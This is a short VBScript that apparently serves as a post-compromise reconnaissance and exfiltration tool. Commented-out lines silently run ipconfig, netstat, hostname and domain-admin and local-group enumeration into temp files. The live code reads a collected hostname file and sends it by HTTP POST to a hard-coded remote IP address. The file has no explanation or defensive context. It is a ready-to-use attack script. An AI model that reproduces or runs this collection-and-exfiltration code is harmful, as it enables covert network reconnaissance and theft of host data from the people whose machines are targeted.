'Set oShell = WScript.CreateObject("WScript.Shell")
'return = oShell.run("cmd /c ipconfig >> %TEMP%\ipconfig.txt", 0, true)
'return = oShell.run("cmd /c netstat >> %TEMP%\netstat.txt", 0, true)
'return = oShell.run("cmd /c hostname >> %TEMP%\hostname.txt", 0, true)
'return = oShell.run("cmd /c net group 'domain admins' /domain >> %TEMP%\domainadmins.txt", 0, true)
'return = oShell.run("cmd /c net localgroup /domain >> %TEMP%\localgroup.txt", 0, true)


Set objFileToRead = CreateObject("Scripting.FileSystemObject").OpenTextFile("c:\temp\hostname.txt",1)
strFileText = objFileToRead.ReadAll()
objFileToRead.Close

'URL to open....
sUrl = "http://10.64.111.156"
'POST Request to send.
sRequest = "file=" & strFileText
HTTPPost sUrl, sRequest
Function HTTPPost(sUrl, sRequest)
set oHTTP = CreateObject("Microsoft.XMLHTTP")
oHTTP.open "POST", sUrl,false
oHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
oHTTP.setRequestHeader "Content-Length", Len(sRequest)
oHTTP.send sRequest
HTTPPost = oHTTP.responseText
End Function
